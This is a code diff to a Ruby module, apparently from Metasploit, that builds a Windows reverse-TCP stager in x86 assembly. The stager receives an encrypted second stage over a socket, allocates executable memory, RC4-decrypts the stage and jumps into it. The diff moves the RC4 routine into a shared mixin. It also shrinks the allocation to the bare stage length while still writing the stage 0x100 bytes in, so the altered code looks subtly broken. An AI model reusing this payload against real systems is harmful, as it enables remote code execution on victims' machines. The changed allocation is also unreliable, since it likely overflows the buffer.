@@ -3,6 +3,7 @@
 require 'msf/core'
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/reverse_tcp'
+require 'msf/core/payload/windows/rc4'
 
 module Msf
 
@@ -16,6 +17,7 @@ module Payload::Windows::ReverseTcpRC4
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseTcp
+  include Msf::Payload::Windows::RC4
 
   #
   # Register reverse_tcp_rc4 specific options
@@ -78,7 +80,6 @@ module Payload::Windows::ReverseTcpRC4
       ; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
       ; Output: None.
       ; Clobbers: EAX, EBX, ECX, EDX, ESI, (ESP will also be modified)
-
       recv:
         ; Receive the size of the incoming second stage...
         push byte 0            ; flags
@@ -90,14 +91,16 @@ module Payload::Windows::ReverseTcpRC4
         ; Alloc a RWX buffer for the second stage
         mov esi, [esi]         ; dereference the pointer to the second stage length
           xor esi, "#{xorkey}"      ; XOR the stage length
-          lea ecx, [esi+0x100]  ; ECX = stage length + S-box length (alloc length)
+          lea ecx, [esi+0x00]  ; ECX = stage length + S-box length (alloc length)
         push byte 0x40         ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; MEM_COMMIT
+      ; push esi               ; push the newly recieved second stage length.
           push ecx             ; push the alloc length
         push byte 0            ; NULL as we dont care where the allocation is.
         push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-        ; Receive the second stage and execute it...
+      ; Receive the second stage and execute it...
+      ;   xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
           lea ebx, [eax+0x100] ; EBX = new stage address
         push ebx               ; push the address of the new stage so we can return into it
           push esi             ; push stage length
@@ -110,7 +113,8 @@ module Payload::Windows::ReverseTcpRC4
         push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
         call ebp               ; recv( s, buffer, length, 0 );
         add ebx, eax           ; buffer += bytes_received
-        sub esi, eax           ; length -= bytes_received, will set flags
+        sub esi, eax           ; length -= bytes_received
+      ; test esi, esi          ; test length
         jnz read_more          ; continue if we have more to read
           pop ebx              ; address of S-box
           pop ecx              ; stage length
@@ -121,64 +125,11 @@ module Payload::Windows::ReverseTcpRC4
           call after_key       ; Call after_key, this pushes the address of the key onto the stack.
           db "#{rc4key}"
       after_key:
-          pop esi                ; ESI = RC4 key
-      #{asm_block_rc4}
-          pop edi              ; restore socket
-        ret                    ; return into the second stage
-    ^
-  end
-
-  def asm_block_rc4
-    asm = %Q^
-      ;-----------------------------------------------------------------------------;
-      ; Author: Michael Schierl (schierlm[at]gmx[dot]de)
-      ; Version: 1.0 (29 December 2012)
-      ;-----------------------------------------------------------------------------;
-      [BITS 32] 
-
-      ; Input: EBP - Data to decode
-      ;        ECX - Data length
-      ;        ESI - Key (16 bytes for simplicity)
-      ;        EDI - pointer to 0x100 bytes scratch space for S-box
-      ; Direction flag has to be cleared
-      ; Output: None. Data is decoded in place.
-      ; Clobbers: EAX, EBX, ECX, EDX, EBP (stack is not used)
-
-        ; Initialize S-box
-        xor eax, eax           ; Start with 0
-      init:
-        stosb                  ; Store next S-Box byte S[i] = i
-        inc al                 ; increase byte to write (EDI is increased automatically)
-        jnz init               ; loop until we wrap around
-        sub edi, 0x100         ; restore EDI
-        ; permute S-box according to key
-        xor ebx, ebx           ; Clear EBX (EAX is already cleared)
-      permute:
-        add bl, [edi+eax]      ; BL += S[AL] + KEY[AL % 16]
-        mov edx, eax 
-        and dl, 0xF 
-        add bl, [esi+edx]
-        mov dl, [edi+eax]      ; swap S[AL] and S[BL]
-        xchg dl, [edi+ebx]
-        mov [edi+eax], dl
-        inc al                 ; AL += 1 until we wrap around
-        jnz permute
-        ; decryption loop
-        xor ebx, ebx           ; Clear EBX (EAX is already cleared)
-      decrypt:
-        inc al                 ; AL += 1
-        add bl, [edi+eax]      ; BL += S[AL]
-        mov dl, [edi+eax]      ; swap S[AL] and S[BL]
-        xchg dl, [edi+ebx]
-        mov [edi+eax], dl
-        add dl, [edi+ebx]      ; DL = S[AL]+S[BL]
-        mov dl, [edi+edx]      ; DL = S[DL]
-        xor [ebp], dl          ; [EBP] \^= DL
-        inc ebp                ; advance data pointer
-        dec ecx                ; reduce counter
-        jnz decrypt            ; until finished
-     ^
-     asm
+        pop esi                ; ESI = RC4 key
+      #{asm_decrypt_rc4}
+        pop edi              ; restore socket
+      ret                    ; return into the second stage
+      ^
   end
 
 private
